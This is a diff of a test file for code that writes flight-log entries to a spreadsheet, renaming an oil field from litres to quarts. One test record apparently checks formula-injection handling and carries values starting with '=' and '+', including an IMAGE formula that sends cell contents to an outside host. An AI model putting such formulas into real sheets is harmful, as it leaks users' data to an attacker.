@@ -73,7 +73,7 @@ describe("writing to the sheet", () => {
         id: "new", flightDate: "2026-04-01", picName: "M.Meikäläinen", secondName: null,
         personsOnBoard: 2, departure: "EFSA", arrival: "EFJO", takeoff: "09:30",
         landing: "10:08", landings: 1, purposeCode: "MAT", fuelLitres: 60.5,
-        oilLitres: null, hourMeter: null, remarks: null,
+        oilQuarts: null, hourMeter: null, remarks: null,
       },
       7,
       parsed.columns
@@ -108,7 +108,7 @@ describe("writing to the sheet", () => {
         id: "new", flightDate: "2026-04-01", picName: "=M.Meikäläinen", secondName: "+1",
         personsOnBoard: 1, departure: "EFSA", arrival: "EFSA", takeoff: "09:30",
         landing: "10:08", landings: 1, purposeCode: "HAR", fuelLitres: null,
-        oilLitres: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
+        oilQuarts: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
       },
       7,
       parsed.columns
